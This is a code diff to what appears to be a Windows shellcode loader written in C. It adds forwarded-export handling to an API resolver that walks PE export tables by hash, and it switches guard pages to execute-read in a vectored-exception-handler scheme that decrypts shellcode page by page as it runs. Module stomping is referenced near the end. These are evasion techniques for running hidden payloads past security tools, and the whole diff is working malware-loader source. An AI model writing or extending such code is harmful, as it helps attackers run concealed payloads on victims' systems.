@@ -174,30 +174,70 @@ static void* _find_module(unsigned int mod_hash) {
     return NULL;
 }
 
+static unsigned int _fwd_modhash(const char *s, DWORD len) {
+    unsigned int h = 0x811c9dc5u;
+    for (DWORD i = 0; i < len; i++) {
+        unsigned char c = (unsigned char)s[i];
+        if (c >= 'A' && c <= 'Z') c += 0x20;
+        h ^= c;
+        h *= 0x01000193u;
+    }
+    const char *ext = ".dll";
+    for (int i = 0; i < 4; i++) {
+        h ^= (unsigned char)ext[i];
+        h *= 0x01000193u;
+    }
+    return h;
+}
+
 static FARPROC _resolve_export(void *mod_base, unsigned int func_hash) {
-    if (!mod_base) return NULL;
-    char *base = (char*)mod_base;
-    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
-    char *nt = base + e_lfanew;
+    for (int depth = 0; depth < 8; depth++) {
+        if (!mod_base) return NULL;
+        char *base = (char*)mod_base;
+        DWORD e_lfanew = *(DWORD*)(base + 0x3C);
+        char *nt = base + e_lfanew;
 
 #ifdef _WIN64
-    DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x70);
-    DWORD export_size = *(DWORD*)(nt + 0x18 + 0x70 + 4);
+        DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x70);
+        DWORD export_size = *(DWORD*)(nt + 0x18 + 0x70 + 4);
 #else
-    DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x60);
-    DWORD export_size = *(DWORD*)(nt + 0x18 + 0x60 + 4);
+        DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x60);
+        DWORD export_size = *(DWORD*)(nt + 0x18 + 0x60 + 4);
 #endif
-    if (!export_rva || !export_size) return NULL;
+        if (!export_rva || !export_size) return NULL;
 
-    char  *exports  = base + export_rva;
-    DWORD  num      = *(DWORD*)(exports + 0x18);
-    DWORD *names    = (DWORD*)(base + *(DWORD*)(exports + 0x20));
-    WORD  *ordinals = (WORD*) (base + *(DWORD*)(exports + 0x24));
-    DWORD *funcs    = (DWORD*)(base + *(DWORD*)(exports + 0x1C));
+        char  *exports  = base + export_rva;
+        DWORD  num      = *(DWORD*)(exports + 0x18);
+        DWORD *names    = (DWORD*)(base + *(DWORD*)(exports + 0x20));
+        WORD  *ordinals = (WORD*) (base + *(DWORD*)(exports + 0x24));
+        DWORD *funcs    = (DWORD*)(base + *(DWORD*)(exports + 0x1C));
 
-    for (DWORD i = 0; i < num; i++) {
-        if (_fnv1a(base + names[i]) == func_hash)
-            return (FARPROC)(base + funcs[ordinals[i]]);
+        DWORD found_rva = 0;
+        int   found     = 0;
+        for (DWORD i = 0; i < num; i++) {
+            if (_fnv1a(base + names[i]) == func_hash) {
+                found_rva = funcs[ordinals[i]];
+                found = 1;
+                break;
+            }
+        }
+        if (!found) return NULL;
+
+        if (found_rva >= export_rva && found_rva < export_rva + export_size) {
+            const char *fwd = base + found_rva;
+            DWORD dot = 0;
+            while (fwd[dot] && fwd[dot] != '.') dot++;
+            if (!fwd[dot]) return NULL;
+
+            unsigned int mod_h  = _fwd_modhash(fwd, dot);
+            unsigned int func_h = _fnv1a(fwd + dot + 1);
+
+            mod_base  = _find_module(mod_h);
+            func_hash = func_h;
+            continue;
+        }
+
+        return (FARPROC)(base + found_rva);
     }
     return NULL;
 }
@@ -428,7 +468,7 @@ static LONG WINAPI _gp_veh_handler(EXCEPTION_POINTERS *ep) {
     if (oldest) {
         pVP(oldest, GP_PAGE_SIZE, PAGE_READWRITE, &old);
         _gp_memset(oldest, 0, GP_PAGE_SIZE);
-        pVP(oldest, GP_PAGE_SIZE, PAGE_READWRITE | PAGE_GUARD, &old);
+        pVP(oldest, GP_PAGE_SIZE, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
     }
 
     /* make target page writable */
@@ -491,11 +531,10 @@ static int _gp_setup(void *dest, SIZE_T sc_len) {
     _gp_regions[0].perms  = PAGE_EXECUTE_READ;
     _gp_regions[0].source = stream_src;
 
-    /* zero destination and set PAGE_GUARD on all pages */
     DWORD old;
     pVP(dest, padded, PAGE_READWRITE, &old);
     _gp_memset(dest, 0, padded);
-    pVP(dest, padded, PAGE_READWRITE | PAGE_GUARD, &old);
+    pVP(dest, padded, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
 
     /* install VEH */
     pAVEH(1, _gp_veh_handler);
@@ -730,7 +769,7 @@ static int engine_run(const unsigned char *sc, unsigned int sc_len) {
 #if defined(EXEC_GUARDPAGE)
     /* guard page streaming: encrypt source, zero dest, install VEH.
      * The VEH will decrypt pages on-demand as code executes through them.
-     * This replaces the normal protect step — guard pages handle permissions. */
+     * This replaces the normal protect step - guard pages handle permissions. */
     if (!_gp_setup(addr, sc_len)) return 0;
 
 #if defined(ALLOC_MODULESTOMP) && defined(_WIN64)
